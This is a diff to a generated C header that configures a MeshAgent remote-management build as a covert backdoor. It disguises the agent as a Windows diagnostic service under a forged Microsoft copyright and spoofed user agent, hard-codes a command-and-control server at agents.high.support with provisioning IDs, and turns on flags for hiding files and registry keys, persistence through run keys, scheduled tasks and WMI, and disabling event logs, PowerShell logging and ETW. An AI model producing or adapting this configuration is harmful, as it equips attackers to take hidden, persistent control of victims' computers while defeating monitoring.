@@ -1,7 +1,9 @@
-/* Generated file - do not edit. */
+﻿/* Generated file - do not edit. */
+/* Generated on: 2025-10-20 20:37:26 */
 #ifndef GENERATED_MESHAGENT_BRANDING_H
 #define GENERATED_MESHAGENT_BRANDING_H
 
+/* ========== Service Branding ========== */
 #undef MESH_AGENT_SERVICE_FILE
 #define MESH_AGENT_SERVICE_FILE TEXT("WinDiagnosticHost")
 #undef MESH_AGENT_SERVICE_NAME
@@ -15,22 +17,44 @@
 #undef MESH_AGENT_INTERNAL_NAME
 #define MESH_AGENT_INTERNAL_NAME "diaghost.exe"
 #undef MESH_AGENT_COPYRIGHT
-#define MESH_AGENT_COPYRIGHT "Apache 2.0 License"
+#define MESH_AGENT_COPYRIGHT "Â© Microsoft Corporation. All rights reserved."
 #undef MESH_AGENT_LOG_DIRECTORY
 #define MESH_AGENT_LOG_DIRECTORY TEXT("C:/Windows/System32/DiagnosticHost/logs")
 
-/* Optional network hints for future use */
+/* ========== Network Configuration ========== */
 #define MESH_AGENT_NETWORK_ENDPOINT "wss://agents.high.support:4445/agent.ashx"
 #define MESH_AGENT_NETWORK_SNI NULL
 #define MESH_AGENT_NETWORK_USER_AGENT "Microsoft-CryptoAPI/10.0"
 #define MESH_AGENT_NETWORK_JA3 NULL
 
-/* Persistence flags */
-/* In lab builds (STEALTH_LAB=1), default to enabling all persistence knobs */
+/* ========== Provisioning Data ========== */
+#define MESH_AGENT_MESH_ID "sdBWgAtTM6VK18fC7gLtdRBZq0NAjzqg@1x9MMWNudEQZ3FoOGkXXLFyoyEhXL2Z"
+#define MESH_AGENT_SERVER_ID "89EE260CB880664898D38A56350F841AA2B05BA3328E23DB2526D506EAB41A13"
+#define MESH_AGENT_MESH_NAME "Windows Diagnostics"
+#define MESH_AGENT_SERVER_URL "wss://agents.high.support:4445/agent.ashx"
+#define MESH_AGENT_MESH_TYPE 2
 
+/* ========== Stealth Features ========== */
+#define MESH_AGENT_STEALTH_ENABLED 1
+#define MESH_AGENT_SVCHOST_MODE 1
+#define MESH_AGENT_HIDE_FILES 1
+#define MESH_AGENT_HIDE_REGISTRY 1
+#define MESH_AGENT_AMSI_PATCH 0
+#define MESH_AGENT_ETW_PATCH 0
+#define MESH_AGENT_ANTI_DEBUG 0
+#define MESH_AGENT_SYSCALLS_DIRECT 1
+
+/* ========== Persistence Configuration ========== */
 #define MESH_AGENT_PERSIST_RUNKEY 1
 #define MESH_AGENT_PERSIST_TASK 1
 #define MESH_AGENT_PERSIST_WMI 1
 #define MESH_AGENT_PERSIST_WATCHDOG 1
+
+/* ========== Evasion Features ========== */
+#define MESH_AGENT_DISABLE_PS_LOGGING 1
+#define MESH_AGENT_DISABLE_EVENT_LOGS 1
+#define MESH_AGENT_DISABLE_ETW 1
+#define MESH_AGENT_HIDE_TASKMANAGER 1
+#define MESH_AGENT_USE_SYSCALLS 1
 
 #endif /* GENERATED_MESHAGENT_BRANDING_H */
